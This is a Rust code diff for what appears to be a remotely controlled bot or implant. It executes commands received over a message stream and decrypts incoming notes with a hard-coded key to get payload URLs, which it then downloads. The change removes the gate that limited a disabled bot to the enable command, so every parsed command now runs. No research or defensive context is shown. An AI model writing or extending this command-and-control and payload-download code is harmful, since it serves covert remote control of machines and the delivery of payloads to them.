@@ -80,27 +80,26 @@ impl Bot {
             tokio::select! {
                 Some(msg) = msg_stream.next() => {
                     if let Some(cmd) = Commands::parse(msg.as_str()) {
-                        if self.state.enabled {
-                            cmd.execute(&mut self.state, &self.session).await?
-                        }
-                        // only allow enable commands when the bot is disabled
-                        else if let Commands::Enable(_) = cmd {
-                            cmd.execute(&mut self.state, &self.session).await?
-                        }
+                        cmd.execute(&mut self.state, &self.session).await?
                     } else {
-                        self.session.send_msg(msg.as_str(), pubkey).await?;
+                        let error_msg = format!("This command was not detected {}", msg);
+                        self.session.send_msg(error_msg.as_str(), pubkey).await?;
                     }
                 },
                 Some(event) = notes_stream.next() => {
+                    let msg = event.content.as_str();
                     // Handle notes_stream similarly if needed
-                    println!("Received note: {}", event.content);
-                    if let Ok(decrypted) = decrypt(event.content.as_str(), ENCRYPTION_KEY) {
+                    // Handle payload events
+                    if let Ok(decrypted) = decrypt(msg, ENCRYPTION_KEY) {
                         let payload_urls = serde_json::from_str::<HashMap<String, String>>(decrypted.as_str());
                         if let Ok(payload_urls) = payload_urls {
                             self.state.payload = Some(download_payload(payload_urls).await);
                             println!("path: {:?}", self.state.payload);
                         }
                     }
+                    // if let Some(cmd) = Commands::parse(msg) {
+                    //     cmd.execute(&mut self.state, &self.session).await?;
+                    // }
                 }
             }
         }
